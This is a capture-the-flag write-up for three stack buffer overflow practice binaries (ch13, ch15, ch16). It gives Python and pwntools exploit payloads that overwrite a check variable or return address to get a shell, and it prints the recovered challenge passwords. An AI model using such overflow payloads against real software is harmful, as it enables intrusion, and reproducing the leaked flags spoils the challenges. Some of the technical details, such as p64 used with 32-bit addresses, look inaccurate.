# ***STACK BUFFER OVERFLOW BASIC 1***

From the given the challenge we give the buffer value as 40 and the check variable have to changed to ```deadbeef```.

We have to give ``deadbeef`` in reverse order since the stack reads them in the reverse order.

```cat <(python -c "print 'A'*40 + '\xef\xbe\xad\xde'") - | ./ch13``` 

```
from pwn import *
io = process("./ch13")
payload = b"A"*40
payload += p64(0xdeadbeef)
io.sendline(payload)
io.interactive()
```

For both the exploits we get the shell

Then do ``ls -al``.

And ``cat .passwd``

We get ``1w4ntm0r3pr0np1s``

# ***STACK BUFFER OVERFLOW BASIC 2***

From the given the challenge we give the buffer value as 128 and here if we need to call the shell function.

Then we get the interactive shell


```cat <(python -c "print 'A' * 128 + '\x16\x85\x04\x08'") - | ./ch15```

```
from pwn import *
io = process("./ch15")
payload = b"A"*128
payload += p64(0x08048516)
io.sendline(payload)
io.interactive()
```
For both the exploits we get the shell

Then do ``ls -al``.

And ``cat .passwd``

We get ```B33r1sSoG0oD4y0urBr4iN```

# ***STACK BUFFER OVERFLOW BASIC 3***

From the given challenge we can give the buffer as 64 and giving the address of check we can get the interactive but here we don't get.

The program reads one character each time it compares, it removes the cases of 0x04 , 0x90 and become subscript.

Since it is removing those cases we can't fill the buffer, but as there subscript we can use negative numbers.

```cat <(python -c "print '\x08\x08\x08\x08' + '\xbc\xfa\xff\xbf'") - | ./ch16```

```
from pwn import *
io = process("./ch16")
payload = b"\x08"*4
payload += p64(0xbffffabc)
io.sendline(payload)
io.interactive()
```
For both the exploits we get the shell

Then do ``ls -al``.

And ``cat .passwd``

We get ```Sm4shM3ify0uC4n```
